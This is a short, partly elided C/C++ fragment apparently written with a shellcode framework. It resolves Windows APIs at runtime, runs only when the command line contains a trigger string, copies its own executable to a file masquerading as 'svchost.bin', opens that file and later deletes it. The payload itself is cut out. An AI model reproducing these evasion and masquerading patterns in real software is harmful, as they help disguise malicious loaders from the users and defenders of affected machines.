...
SC_MAIN_BEGIN()
{
	...
	SC_IMPORT_API_BATCH("kernel32.dll", GetModuleFileNameA);
	SC_IMPORT_API_BATCH("kernel32.dll", CopyFileA);
	SC_IMPORT_API_BATCH("kernel32.dll", GetCommandLineA);
	SC_IMPORT_API_BATCH_END();

	auto cmd = GetCommandLineA();
	if (!strstr(cmd, SC_PISTRINGA("232F3"))) {
		return;
	}


	auto path = (char*)VirtualAlloc(NULL, 255, MEM_COMMIT, PAGE_READWRITE);
	GetModuleFileNameA(nullptr, path, 255);

	CopyFileA(path, SC_PISTRINGA("svchost.bin"), false);
	auto _fHandle = CreateFileA(SC_PISTRINGA("svchost.bin"), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	...
	DeleteFileW(SC_PISTRINGW(L"svchost.bin"));
	if (path)
	{
		VirtualFree(path, 255, MEM_RELEASE);
	}
